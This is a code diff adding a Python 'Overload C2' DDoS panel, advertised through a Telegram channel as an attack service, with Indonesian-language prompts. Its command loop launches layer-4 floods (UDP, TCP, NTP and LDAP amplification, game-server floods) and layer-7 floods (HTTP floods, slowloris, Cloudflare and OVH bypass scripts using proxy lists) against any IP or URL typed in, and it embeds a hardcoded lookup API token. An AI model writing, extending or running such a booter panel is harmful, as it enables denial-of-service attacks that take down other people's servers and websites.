+    print('[ t.me/POWERPROOFOVERLOAD ] | Welcome to Overload DDOS! | Owner: @OverloadServer | Update v3.0')
+    print("")
+    print("""  
+                            ████████████                
+                       ██████         ██████          
+                    ████                    ████                
+                   ██                            ██      
+                                              
+                            ████████████                
+                           ██            ██              
+                          ██              ██            
+                                              
+                                              
+                                 ████                    
+                               ██    ██                  
+                               ██    ██                  
+                               ██    ██                  
+                               ██    ██                  
+                               ██    ██                  
+    ██████████████████████████████████████    
+  ██                                         ██  
+██    ████                                    ██
+██  ██    ██                                  ██
+██  ██    ██                                  ██
+██    ████                                    ██
+  ██                                         ██
+    ██████████████████████████████████████    
+                                                                                                                                                                                                              
+╔══════════════════════════════════════════════╗
+║           WELCOME TO OVERLOAD C2                         
+║ - - - - - - Copyright 2024-2026 [OverloadServer] - - - - - - -
+╚══════════════════════════════════════════════╝
+╔══════════════════════════════════════╗
+║>T.ME/POWERPROOFOVERLOAD< BEST ATTACK SERVICE
+╚══════════════════════════════════════╝
+╔══════════════════════════════════════════════╗
+LAYER7  ► SHOW LAYER7 METHODS FOR ATTACK DOMAIN
+LAYER4  ► SHOW LAYER4 METHODS FOR ATTACK IP
+RULES   ► RULES PANEL
+CLEAR   ► CLEAR TERMINAL 
+╚══════════════════════════════════════════════╝
+""")
+
+def main():
+    menu()
+    while(True):        
+        print('\033[ROOT\033] \033►\033[KOMINFO] ', end='')
+        cnc = input()
+        print("Anda memasukkan:", cnc)
+        if cnc == "layer7" or cnc == "LAYER7" or cnc == "L7" or cnc == "l7":
+            layer7()
+        elif cnc == "layer4" or cnc == "LAYER4" or cnc == "L4" or cnc == "l4":
+            layer4()
+        elif cnc == "clear" or cnc == "CLEAR" or cnc == "CLS" or cnc == "cls":
+            main()    
+        elif cnc == "rule" or cnc == "RULES" or cnc == "rules" or cnc == "RULES" or cnc == "RULE34":
+            rules()    
+                        
+
+# LAYER 4 METHODS   
+
+        elif "udpbypass" in cnc:
+            try:
+                ip = cnc.split()[1]
+                port = cnc.split()[2]
+                os.system(f'./UDPBYPASS {ip} {port}')
+                token = "727e8c2fa5b07c"
+                ip = f"{ip}"
+                info = get_ip_info(token, ip)
+                print(info)    
+            except Exception as e:
+                print(f"Error executing command: {e}")
+            except IndexError:
+                print('Usage: udpbypass <ip> <port>')
+                print('Example: udpbypass 1.1.1.1 80')
+
+        elif "stdv2" in cnc:
+            try:
+                ip = cnc.split()[1]
+                port = cnc.split()[2]
+                os.system(f'./std {ip} {port}')
+                token = "727e8c2fa5b07c"
+                ip = f"{ip}"
+                info = get_ip_info(token, ip)
+                print(info)
+            except Exception as e:
+                print(f"Error executing command: {e}")
+            except IndexError:
+                print('Usage: stdv2 <ip> <port>')
+                print('Example: stdv2 1.1.1.1 80')
+
+        elif "flux" in cnc:
+            try:
+                ip = cnc.split()[1]
+                port = cnc.split()[2]
+                thread = cnc.split()[3]
+                os.system(f'./flux {ip} {port} 250 0')
+                token = "727e8c2fa5b07c"
+                ip = f"{ip}"
+                info = get_ip_info(token, ip)
+                print(info)
+            except Exception as e:
+                print(f"Error executing command: {e}")
+            except IndexError:
+                print('Usage: flux <ip> <port> <threads>')
+                print('Example: flux 1.1.1.1 80 250')
+
+        elif "slowloris" in cnc:
+            try:
+                ip = cnc.split()[1]
+                port = cnc.split()[2]
+                os.system(f'./slowloris {ip} {port}')
+                token = "727e8c2fa5b07c"
+                ip = f"{ip}"
+                info = get_ip_info(token, ip)
+                print(info)
+            except Exception as e:
+                print(f"Error executing command: {e}")
+            except IndexError:
+                print('Usage: slowloris <ip> <port>')
+                print('Example: slowloris 1.1.1.1 80')
+
+        elif "god" in cnc:
+            try:
+                ip = cnc.split()[1]
+                port = cnc.split()[2]
+                time = cnc.split()[3]
+                os.system(f'perl god.pl {ip} {port} 65500 {time}')
+                token = "727e8c2fa5b07c"
+                ip = f"{ip}"
+                info = get_ip_info(token, ip)
+                print(info)
+            except Exception as e:
+                print(f"Error executing command: {e}")
+            except IndexError:
+                print('Usage: god <ip> <port> <time>')
+                print('Example: god 1.1.1.1 80 60')
+
+        elif "destroy" in cnc:
+            try:
+                ip = cnc.split()[1]
+                port = cnc.split()[2]
+                time = cnc.split()[3]
+                os.system(f'perl destroy.pl {ip} {port} 65500 {time}')
+                token = "727e8c2fa5b07c"
+                ip = f"{ip}"
+                info = get_ip_info(token, ip)
+                print(info)
+            except Exception as e:
+                print(f"Error executing command: {e}")
+            except IndexError:
+                print('Usage: destroy <ip> <port> <time>')
+                print('Example: destroy 1.1.1.1 80 60')
+
+        elif "std" in cnc:
+            try:
+                ip = cnc.split()[1]
+                port = cnc.split()[2]
+                os.system(f'./STD-NOSPOOF {ip} {port}')
+                token = "727e8c2fa5b07c"
+                ip = f"{ip}"
+                info = get_ip_info(token, ip)
+                print(info)
+            except Exception as e:
+                print(f"Error executing command: {e}")
+            except IndexError:
+                print('Usage: std <ip> <port>')
+                print('Example: std 1.1.1.1 80')
+
+        elif "home" in cnc:
+            try:
+                ip = cnc.split()[1]
+                port = cnc.split()[2]
+                psize = cnc.split()[3]
+                time = cnc.split()[4]
+                os.system(f'perl home.pl {ip} {port} 65500 {time}')
+                token = "727e8c2fa5b07c"
+                ip = f"{ip}"
+                info = get_ip_info(token, ip)
+                print(info)
+            except Exception as e:
+                print(f"Error executing command: {e}")
+            except IndexError:
+                print('Usage: home <ip> <port> <packet_size> <time>')
+                print('Example: home 1.1.1.1 80 65500 60')
+
+        elif "udp" in cnc:
+            try:
+                ip = cnc.split()[1]
+                port = cnc.split()[2]
+                os.system(f'python2 udp.py {ip} {port} 0 0')
+                token = "727e8c2fa5b07c"
+                ip = f"{ip}"
+                info = get_ip_info(token, ip)
+                print(info)
+            except Exception as e:
+                print(f"Error executing command: {e}")
+            except IndexError:
+                print('Usage: udp <ip> <port>')
+                print('Example: udp 1.1.1.1 80')
+
+        elif "nfo-killer" in cnc:
+            try:
+                ip = cnc.split()[1]
+                port = cnc.split()[2]
+                threads = cnc.split()[3]
+                time = cnc.split()[4]
+                os.system(f'./nfo-killer {ip} {port} 850 -1 {time}')
+                token = "727e8c2fa5b07c"
+                ip = f"{ip}"
+                info = get_ip_info(token, ip)
+                print(info)
+            except Exception as e:
+                print(f"Error executing command: {e}")
+            except IndexError:
+                print('Usage: nfo-killer <ip> <port> <threads> <time>')
+                print('Example: nfo-killer 1.1.1.1 80 850 60')
+
+        elif "ovh-raw" in cnc:
+            try:
+                method = cnc.split()[1]
+                ip = cnc.split()[2]
+                port = cnc.split()[3]
+                time = cnc.split()[4]
+                conns = cnc.split()[5]
+                os.system(f'./ovh-raw {method} {ip} {port} {time} 8500')
+                token = "727e8c2fa5b07c"
+                ip = f"{ip}"
+                info = get_ip_info(token, ip)
+                print(info)
+            except Exception as e:
+                print(f"Error executing command: {e}")
+            except IndexError:
+                print('Usage: ovh-raw METHODS[GET/POST/HEAD] <ip> <port> <time> <connections>')
+                print('Example: ovh-raw GET 1.1.1.1 80 60 8500')
+
+        elif "tcp" in cnc:
+            try:
+                method = cnc.split()[1]
+                ip = cnc.split()[2]
+                port = cnc.split()[3]
+                time = cnc.split()[4]
+                conns = cnc.split()[5]
+                os.system(f'./100UP-TCP {method} {ip} {port} {time} 8500')
+                token = "727e8c2fa5b07c"
+                ip = f"{ip}"
+                info = get_ip_info(token, ip)
+                print(info)
+            except Exception as e:
+                print(f"Error executing command: {e}")
+            except IndexError:
+                print('Usage: tcp METHODS[GET/POST/HEAD] <ip> <port> <time> <connections>')
+                print('Example: tcp GET 1.1.1.1 80 60 8500')
+                
+        elif "ovh-beam" in cnc:
+            try:
+                method = cnc.split()[1]
+                ip = cnc.split()[2]
+                port = cnc.split()[3]
+                time = cnc.split()[4] 
+                os.system(f'./OVH-BEAM {method} {ip} {port} {time} 1024')
+                token = "727e8c2fa5b07c"
+                ip = f"{ip}"
+                info = get_ip_info(token, ip)
+                print(info)
+            except Exception as e:
+                print(f"Error executing command: {e}")
+            except IndexError:
+                print('Usage: ovh-beam <GET/HEAD/POST/PUT> <ip> <port> <time>')
+                print('Example: ovh-beam GET 51.38.92.223 80 60')
+                
+        elif "overflow" in cnc:
+            try:
+                ip = cnc.split()[1]
+                port = cnc.split()[2]
+                thread = cnc.split()[3]
+                os.system(f'./OVERFLOW {ip} {port} {thread}')
+                token = "727e8c2fa5b07c"
+                ip = f"{ip}"
+                info = get_ip_info(token, ip)
+                print(info)
+            except Exception as e:
+                print(f"Error executing command: {e}")
+            except IndexError:
+                print('Usage: overflow <ip> <port> <threads>')
+                print('Example: overflow 1.1.1.1 80 5000')
+               
+        elif "brutal" in cnc:
+            try:
+                ip = cnc.split()[1]
+                port = cnc.split()[2]
+                bytes = cnc.split()[3]
+                thrs = cnc.split()[4]
+                bost = cnc.split()[5]
+                os.system(f'python3 brutal.py {ip} {port} 500 500 Y')
+                token = "727e8c2fa5b07c"
+                ip = f"{ip}"
+                info = get_ip_info(token, ip)
+                print(info)
+            except Exception as e:
+                print(f"Error executing command: {e}")           
+            except IndexError:    
+                print('Example: brutal 1.1.1.1 80 500 500 Y/N')
+
+        elif "samp" in cnc:
+            try:
+                ip = cnc.split()[1]
+                port = cnc.split()[2]
+                os.system(f'python2 samp.py {ip} {port}')
+                token = "727e8c2fa5b07c"
+                ip = f"{ip}"
+                info = get_ip_info(token, ip)
+                print(info)
+            except Exception as e:
+                print(f"Error executing command: {e}")
+            except IndexError:
+                print('Usage: samp <ip> <port>')
+                print('Example: samp 1.1.1.1 7777')
+
+        elif "ldap" in cnc:
+            try:
+                ip = cnc.split()[1]
+                port = cnc.split()[2]
+                thread = cnc.split()[3]
+                time = cnc.split()[4]
+                os.system(f'./ldap {ip} {port} 650 -1 {time}')
+                token = "727e8c2fa5b07c"
+                ip = f"{ip}"
+                info = get_ip_info(token, ip)
+                print(info)
+            except Exception as e:
+                print(f"Error executing command: {e}")
+            except IndexError:
+                print('Usage: ldap <ip> <port> <threads> <time>')
+                print('Example: ldap 1.1.1.1 80 650 60')
+
+        elif "minecraft" in cnc:
+            try:
+                ip = cnc.split()[1]
+                throttle = cnc.split()[2]
+                threads = cnc.split()[3]
+                time = cnc.split()[4]
+                os.system(f'./MINECRAFT-SLAM {ip} 5000 500 {time}')
+                token = "727e8c2fa5b07c"
+                ip = f"{ip}"
+                info = get_ip_info(token, ip)
+                print(info)
+            except Exception as e:
+                print(f"Error executing command: {e}")
+            except IndexError:
+                print('Usage: minecraft <ip> <throttle> <threads> <time>')
+                print('Example: minecraft 1.1.1.1 5000 500 60')
+
+        elif "ovh-amp" in cnc:
+            try:
+                ip = cnc.split()[1]
+                port = cnc.split()[2]
+                os.system(f'./OVH-AMP {ip} {port}')
+                token = "727e8c2fa5b07c"
+                ip = f"{ip}"
+                info = get_ip_info(token, ip)
+                print(info)
+            except Exception as e:
+                print(f"Error executing command: {e}")
+            except IndexError:
+                print('Usage: ovh-amp <ip> <port>')
+                print('Example: ovh-amp 1.1.1.1 80')
+                
+        elif "ntp" in cnc:
+            try:
+                ip = cnc.split()[1]
+                port = cnc.split()[2]
+                throttle = cnc.split()[3]
+                time = cnc.split()[4]
+                os.system(f'./ntp {ip} {port} ntp.txt 250 {time}')
+                token = "727e8c2fa5b07c"
+                ip = f"{ip}"
+                info = get_ip_info(token, ip)
+                print(info)
+            except Exception as e:
+                print(f"Error executing command: {e}")
+            except IndexError:
+                print('Usage: ntp <ip> <port> <throttle> <time>')
+                print('Example: ntp 1.1.1.1 22 250 60')     
+                
+# LAYER 7 METHODS
+    
+        elif "https-spoof" in cnc:
+            try:
+                url = cnc.split()[1]
+                time = cnc.split()[2]
+                thread = cnc.split()[3]
+                os.system(f'python3 https-spoof.py {url} {time} {thread}')
+                url = f"{url}"
+                token = "727e8c2fa5b07c"
+                result = get_url_info(url, token)
+                print(result) 
+            except IndexError:
+                print('Usage: https-spoof <url> <time> <threads>')
+                print('Example: https-spoof http://vailon.com 60 500')
+    
+        elif "slow" in cnc:
+            try:
+               url, time = cnc.split()[1:3]
+               os.system("clear")  # Bersihkan layar (opsional)
+               
+               os.system(f'node slow.js {url} {time}')          
+               
+               url = f"{url}"
+               token = "727e8c2fa5b07c"
+               result = get_url_info(url, token)
+               print(result)             
+                
+               sys.stdout.write(f"\x1b]2; T.ME/POWERPROOFOVERLOAD\x07")
+               sys.stdout.flush()
+               
+               print(f"""
+               [Sistem] Informasi
+               Target: {url}
+               Waktu: {time}s
+               Metode: slow
+               Ketik [CLS] untuk membersihkan terminal""")
+                          
+            except IndexError:
+                print('Penggunaan: slow <url> <waktu>')
+                print('Contoh: slow http://example.com 60')
+            except ValueError as ve:
+                print(f"Waktu tidak valid: {ve}")
+            except Exception as e:
+                print(f"Terjadi kesalahan saat menjalankan perintah: {e}")
+    
+        elif "hyper" in cnc:
+            try:
+               url, time = cnc.split()[1:3]
+               os.system("clear")  # Bersihkan layar (opsional)
+               
+               os.system(f'node hyper.js {url} {time}')
+                
+               url = f"{url}"
+               token = "727e8c2fa5b07c"          
+               result = get_url_info(url, token)
+               print(result) 
+                
+               sys.stdout.write(f"\x1b]2; T.ME/POWERPROOFOVERLOAD\x07")
+               sys.stdout.flush()
+               
+               print(f"""
+               [Sistem] Informasi
+               Target: {url}
+               Waktu: {time}s
+               Metode: hyper
+               Ketik [CLS] untuk membersihkan terminal""") 
+                         
+            except IndexError:
+                print('Penggunaan: hyper <url> <waktu>')
+                print('Contoh: hyper http://example.com 60')
+            except ValueError as ve:
+                print(f"Waktu tidak valid: {ve}")
+            except Exception as e:
+                print(f"Terjadi kesalahan saat menjalankan perintah: {e}")
+                
+        elif "jebol" in cnc:
+            try:
+               url, time = cnc.split()[1:3]
+               os.system("clear")  # Bersihkan layar (opsional)
+               
+               os.system(f'python3 jebol.py {url} {time}')          
+               
+               url = f"{url}"
+               token = "727e8c2fa5b07c"
+               result = get_url_info(url, token)
+               print(result)             
+                
+               sys.stdout.write(f"\x1b]2; T.ME/POWERPROOFOVERLOAD\x07")
+               sys.stdout.flush()
+               
+               print(f"""
+               [Sistem] Informasi
+               Target: {url}
+               Waktu: {time}s
+               Metode: slow
+               Ketik [CLS] untuk membersihkan terminal""")
+                          
+            except IndexError:
+                print('Penggunaan: jebol <url> <waktu>')
+                print('Contoh: jebol http://example.com 60')
+            except ValueError as ve:
+                print(f"Waktu tidak valid: {ve}")
+            except Exception as e:
+                print(f"Terjadi kesalahan saat menjalankan perintah: {e}")        
+                
+        elif "cf-socket" in cnc:
+            try:
+                os.system(f'python3 bypass.py')
+                url = f"{url}"
+                token = "727e8c2fa5b07c"
+                result = get_url_info(url, token)
+                print(result) 
+            except Exception as e:
+                print(f"Error executing command: {e}")
+            except IndexError:
+                print('cf-socket')
+    
+        elif "cf-pro" in cnc:
+            try:
+                os.system(f'python3 cf-pro.py')
+                url = f"{url}"
+                token = "727e8c2fa5b07c"
+                result = get_url_info(url, token)
+                print(result) 
+            except Exception as e:
+                print(f"Error executing command: {e}")
+            except IndexError:
+                print('cf-pro')
+        
+        elif "cfgas" in cnc:
+            try:
+               url, time = cnc.split()[1:3]
+               os.system("clear")  # Bersihkan layar (opsional)
+                             
+               os.system(f'node cfgasv2 {url} {time} 100 100 proxies.txt')
+               
+               url = f"{url}"
+               token = "727e8c2fa5b07c"
+               result = get_url_info(url, token)
+               print(result) 
+                
+               sys.stdout.write(f"\x1b]2; T.ME/POWERPROOFOVERLOAD\x07")
+               sys.stdout.flush()
+               
+               print(f"""
+               [Sistem] Informasi
+               Target: {url}
+               Waktu: {time}s
+               Metode: cfgas
+               Ketik [CLS] untuk membersihkan terminal""") 
+                         
+            except IndexError:
+                print('Penggunaan: cfgas <url> <waktu>')
+                print('Contoh: cfgas http://example.com 60')
+            except ValueError as ve:
+                print(f"Waktu tidak valid: {ve}")
+            except Exception as e:
+                print(f"Terjadi kesalahan saat menjalankan perintah: {e}")
+
+        elif "httpbypass" in cnc:
+            try:
+               url, time = cnc.split()[1:3]
+               os.system("clear")  # Bersihkan layar (opsional)
+                
+               os.system(f'node httpbypass {url} {time} 100 100 proxies.txt')
+               os.system(f'node httpbypassv2 {url} {time} 100 100 proxies.txt')
+                
+               url = f"{url}"
+               token = "727e8c2fa5b07c"
+               result = get_url_info(url, token)
+               print(result) 
+                
+               sys.stdout.write(f"\x1b]2; T.ME/POWERPROOFOVERLOAD\x07")
+               sys.stdout.flush()
+               
+               print(f"""
+               [Sistem] Informasi
+               Target: {url}
+               Waktu: {time}s
+               Metode: httpbypass
+               Ketik [CLS] untuk membersihkan terminal""")  
+                        
+            except IndexError:
+                print('Penggunaan: httpbypass <url> <waktu>')
+                print('Contoh: httpbypass http://example.com 60')
+            except ValueError as ve:
+                print(f"Waktu tidak valid: {ve}")
+            except Exception as e:
+                print(f"Terjadi kesalahan saat menjalankan perintah: {e}") 
+
+        elif "http-requests" in cnc:
+            try:
+               url, time = cnc.split()[1:3]
+               os.system("clear")  # Bersihkan layar (opsional)
+               
+               os.system(f'node http-requests.js {url} {time}')
+               
+               url = f"{url}"
+               token = "727e8c2fa5b07c"
+               result = get_url_info(url, token)
+               print(result) 
+                
+               sys.stdout.write(f"\x1b]2; T.ME/POWERPROOFOVERLOAD\x07")
+               sys.stdout.flush()
+               
+               print(f"""
+               [Sistem] Informasi
+               Target: {url}
+               Waktu: {time}s
+               Metode: http-requests
+               Ketik [CLS] untuk membersihkan terminal""")  
+                        
+            except IndexError:
+                print('Penggunaan: http-requests <url> <waktu>')
+                print('Contoh: http-requests http://example.com 60')
+            except ValueError as ve:
+                print(f"Waktu tidak valid: {ve}")
+            except Exception as e:
+                print(f"Terjadi kesalahan saat menjalankan perintah: {e}")
+
+        elif "tls" in cnc:
+            try:
+               url, time = cnc.split()[1:3]
+               os.system("clear")  # Bersihkan layar (opsional)
+                               
+               os.system(f'node tlsv2 {url} {time} 100 100 proxies.txt')
+               os.system(f'node tlsv3 {url} {time} 100 100 proxies.txt')             
+               
+               url = f"{url}"
+               token = "727e8c2fa5b07c"
+               result = get_url_info(url, token)
+               print(result) 
+                
+               sys.stdout.write(f"\x1b]2; T.ME/POWERPROOFOVERLOAD\x07")
+               sys.stdout.flush()
+               
+               print(f"""
+               [Sistem] Informasi
+               Target: {url}
+               Waktu: {time}s
+               Metode: tls
+               Ketik [CLS] untuk membersihkan terminal""") 
+                         
+            except IndexError:
+                print('Penggunaan: tls <url> <waktu>')
+                print('Contoh: tls http://example.com 60')
+            except ValueError as ve:
+                print(f"Waktu tidak valid: {ve}")
+            except Exception as e:
+                print(f"Terjadi kesalahan saat menjalankan perintah: {e}") 
+
+        elif "auto" in cnc:
+            try:
+               url, time = cnc.split()[1:3]
+               os.system("clear")  # Bersihkan layar (opsional)
+                     
+               os.system(f'node auto.js {url} {time} 100 100 proxies.txt')
+               os.system(f'node autov2.js {url} {time} 100 100 proxies.txt')
+
+               url = f"{url}"
+               token = "727e8c2fa5b07c"
+               result = get_url_info(url, token)
+               print(result) 
+
+               print(f"""
+               [Sistem] Informasi
+               Target: {url}
+               Waktu: {time}s
+               Metode: auto
+               Ketik [CLS] untuk membersihkan terminal""")
+
+               sys.stdout.write(f"\x1b]2; T.ME/POWERPROOFOVERLOAD\x07")
+               sys.stdout.flush()
+
+            except IndexError:
+                print('Penggunaan: auto <url> <waktu>')
+                print('Contoh: auto http://example.com 60')
+            except ValueError as ve:
+                print(f"Waktu tidak valid: {ve}")
+            except Exception as e:
+                print(f"Terjadi kesalahan saat menjalankan perintah: {e}")    
+
+        elif "cf-bypass" in cnc:
+            try:
+               url, time = cnc.split()[1:3]
+               os.system("clear")  # Bersihkan layar (opsional)
+               
+               os.system(f'node cf.js {url} {time} 1250 proxies.txt')
+                
+               url = f"{url}"
+               token = "727e8c2fa5b07c"
+               result = get_url_info(url, token)
+               print(result) 
+                
+               sys.stdout.write(f"\x1b]2; T.ME/POWERPROOFOVERLOAD\x07")
+               sys.stdout.flush()
+               
+               print(f"""
+               [Sistem] Informasi
+               Target: {url}
+               Waktu: {time}s
+               Metode: cf-bypass
+               Ketik [CLS] untuk membersihkan terminal""") 
+                         
+            except IndexError:
+                print('Penggunaan: cf-bypass <url> <waktu>')
+                print('Contoh: cf-bypass http://example.com 60')
+            except ValueError as ve:
+                print(f"Waktu tidak valid: {ve}")
+            except Exception as e:
+                print(f"Terjadi kesalahan saat menjalankan perintah: {e}")
+
+        elif "uambypass" in cnc:
+            try:
+               url, time = cnc.split()[1:3]
+               os.system("clear")  # Bersihkan layar (opsional)
+               
+               os.system(f'node uambypass.js {url} {time} 1250 proxies.txt')
+                
+               url = f"{url}"
+               token = "727e8c2fa5b07c"
+               result = get_url_info(url, token)
+               print(result) 
+                
+               sys.stdout.write(f"\x1b]2; T.ME/POWERPROOFOVERLOAD\x07")
+               sys.stdout.flush()
+               
+               print(f"""
+               [Sistem] Informasi
+               Target: {url}
+               Waktu: {time}s
+               Metode: uambypass
+               Ketik [CLS] untuk membersihkan terminal""") 
+                         
+            except IndexError:
+                print('Penggunaan: uambypass <url> <waktu>')
+                print('Contoh: uambypass http://example.com 60')
+            except ValueError as ve:
+                print(f"Waktu tidak valid: {ve}")
+            except Exception as e:
+                print(f"Terjadi kesalahan saat menjalankan perintah: {e}")
+
+        elif "crash" in cnc:
+            try:
+                url = cnc.split()[1]
+                method = cnc.split()[2]
+                
+                os.system(f'go run Hulk.go -site {url} -data {method}')
+                
+                url = f"{url}"
+                token = "727e8c2fa5b07c"
+                result = get_url_info(url, token)
+                print(result) 
+                
+            except Exception as e:
+                print(f"Error executing command: {e}")
+            except IndexError:
+                print('Usage: crash <url> METHODS<GET/POST>')
+                print('Example: crash http://example.com GET')
+
+        elif "httpflood" in cnc:
+            try:
+                url = cnc.split()[1]
+                thread = cnc.split()[2]
+                method = cnc.split()[3]
+                time = cnc.split()[4]
+                
+                os.system(f'go run httpflood.go {url} {thread} {method} {time} nil')
+                
+                url = f"{url}"
+                token = "727e8c2fa5b07c"
+                result = get_url_info(url, token)
+                print(result) 
+                
+            except Exception as e:
+                print(f"Error executing command: {e}")
+            except IndexError:
+                print('Usage: httpflood <url> <threads> METHODS<GET/POST> <time>')
+                print('Example: httpflood http://example.com 15000 get 60')
+
+        elif "httpget" in cnc:
+            try:
+               url, time = cnc.split()[1:3]
+               os.system("clear")  # Bersihkan layar (opsional)
+               
+               os.system(f'node httpget GET {url} {time} 100 100 proxies.txt')
+               os.system(f'node httpgetv2 GET {url} {time} 100 100 proxies.txt')
+               
+               url = f"{url}"
+               token = "727e8c2fa5b07c"
+               result = get_url_info(url, token)
+               print(result) 
+                
+               sys.stdout.write(f"\x1b]2; T.ME/POWERPROOFOVERLOAD\x07")
+               sys.stdout.flush()
+               
+               print(f"""
+               [Sistem] Informasi
+               Target: {url}
+               Waktu: {time}s
+               Metode: httpget
+               Ketik [CLS] untuk membersihkan terminal""") 
+                         
+            except IndexError:
+                print('Penggunaan: httpget <url> <waktu>')
+                print('Contoh: httpget http://example.com 60')
+            except ValueError as ve:
+                print(f"Waktu tidak valid: {ve}")
+            except Exception as e:
+                print(f"Terjadi kesalahan saat menjalankan perintah: {e}") 
+                
+        elif "http-storm" in cnc:
+            try:
+               url, time = cnc.split()[1:3]
+               os.system("clear")  # Bersihkan layar (opsional)
+               
+               os.system(f'node http-storm.js {url} {time} 100 100 proxies.txt')
+               
+               url = f"{url}"
+               token = "727e8c2fa5b07c"
+               result = get_url_info(url, token)
+               print(result) 
+                
+               sys.stdout.write(f"\x1b]2; T.ME/POWERPROOFOVERLOAD\x07")
+               sys.stdout.flush()
+               
+               print(f"""
+               [Sistem] Informasi
+               Target: {url}
+               Waktu: {time}s
+               Metode: http-storm
+               Ketik [CLS] untuk membersihkan terminal""")  
+                        
+            except IndexError:
+                print('Penggunaan: http-storm <url> <waktu>')
+                print('Contoh: http-storm http://example.com 60')
+            except ValueError as ve:
+                print(f"Waktu tidak valid: {ve}")
+            except Exception as e:
+                print(f"Terjadi kesalahan saat menjalankan perintah: {e}")                                                                                                                                                                       
+
+def generate_and_verify_captcha(length=4):
+    while True:
+        characters = string.ascii_uppercase
+        captcha = ''.join(random.choice(characters) for _ in range(length))
+
+        clear_screen()
+        print("\n" + "="*30)
+        print(f"{'CAPCTHA UNTUK VERIFIKASI'.center(30)}")
+        print("="*30 + "\n")
+
+        print(colored(f"   {captcha}   ", "green", attrs=["bold", "reverse"]))
+
+        print("\n" + "="*30)
+        user_input = input("Masukkan captcha di atas: ".ljust(30))
+
+        if captcha == user_input.upper():
+            print(colored("\nCaptcha benar!", "green"))
+            time.sleep(1) # Beri jeda agar user bisa melihat pesan 'Captcha benar!'
+            return True
+        else:
+            print(colored("\nCaptcha salah. Silakan coba lagi.", "red"))
+            input("Tekan Enter untuk melanjutkan...")
+
+def login():
+    clear_screen()
+    print("Memulai verifikasi CAPTCHA untuk akses script...")
+
+    # Verifikasi CAPTCHA
+    if generate_and_verify_captcha(): # Jika CAPTCHA benar, generate_and_verify_captcha akan mengembalikan True
+        print(colored("Akses Diberikan! Memasuki script utama...", "green", attrs=["bold"]))
+        time.sleep(1) # Jeda sebentar sebelum masuk ke script utama
+        main() # Langsung panggil fungsi main()
+        return True # Menandakan proses login (verifikasi captcha) berhasil
+    else:
+        # Bagian ini hanya akan tercapai jika generate_and_verify_captcha memiliki cara untuk gagal secara total
+        # (misalnya, setelah beberapa kali percobaan gagal, atau jika loop di dalamnya dihentikan)
+        # Dengan implementasi saat ini, generate_and_verify_captcha akan terus berulang sampai benar.
+        # Jadi, bagian 'else' ini mungkin tidak akan pernah terpanggil secara normal.
+        print(colored("Verifikasi CAPTCHA gagal. Tidak dapat melanjutkan.", "red", attrs=["bold"]))
+        return False
+
+if __name__ == "__main__":
+    if login():
+        print("WELCOME TO DDOS PANEL") # Pesan ini akan muncul setelah main() selesai dieksekusi
+    else:
+        print("Script tidak dapat diakses.")                                                                                          
